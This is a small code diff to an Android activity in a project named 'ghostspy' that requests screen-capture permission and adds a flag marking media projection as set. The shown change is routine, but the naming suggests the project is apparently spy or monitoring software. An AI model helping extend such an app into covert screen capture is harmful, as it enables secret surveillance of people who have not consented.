@@ -20,6 +20,7 @@ import androidx.core.content.ContextCompat;
 
 import com.spy.ghostspy.R;
 import com.spy.ghostspy.services.ScreenCaptureForegroundService;
+import com.spy.ghostspy.utils.Common;
 
 public class CaptureActivity extends Activity {
     private static final int MediaProjection_REQUEST_CODE = 1000;
@@ -55,6 +56,7 @@ public class CaptureActivity extends Activity {
     }
 
     private void setPermission() {
+        Common.getInstance().setMediaProjection(true);
         mProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
         startActivityForResult(mProjectionManager.createScreenCaptureIntent(), MediaProjection_REQUEST_CODE);
     }
